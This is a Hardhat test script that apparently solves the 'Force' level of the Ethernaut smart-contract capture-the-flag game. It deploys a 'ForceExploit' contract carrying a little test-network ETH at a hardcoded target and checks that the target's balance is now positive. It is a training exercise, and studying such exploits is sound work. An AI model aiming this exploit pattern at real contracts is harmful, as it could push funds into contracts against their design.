import { ethers } from "hardhat";
import { utils } from "ethers";
import { expect } from "chai";

describe("Force", function(){
	it("Aims to Solve the Force Question of the Ethernaut CTF", async function(){
		this.timeout(0);

        // Initial Setup (Wallet etc..) 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();

        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0); // Check if the wallet amount is greater than 0 (If you have any money)

        // Define Target ABI
        // const targetABI = []
        const targetAddr = "0x9452Bd95FD9587d96200A2FAC4B319336e1F9467"; // Target Contract Address Here

        // Connect to the Target Contract
        // let contract = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
        // let targetCont = contract.connect(eoa);

		// Define and Connect to the Malicious Contract (with value this time)
        const maliciousFactory = await ethers.getContractFactory("ForceExploit");
        const maliciousContract = await maliciousFactory.deploy(targetAddr, { value: ethers.utils.parseEther("0.0005") });

        // Wait for Malicious Contract to be Deployed
        await eoa.provider!.waitForTransaction(maliciousContract.deployTransaction.hash);

        // Final Check
       	let target_balance = await ethers.getDefaultProvider("rinkeby").getBalance(targetAddr);
       	console.log(`Current Owner: ${target_balance}`);
       	expect(target_balance).to.gt(0);
	});
});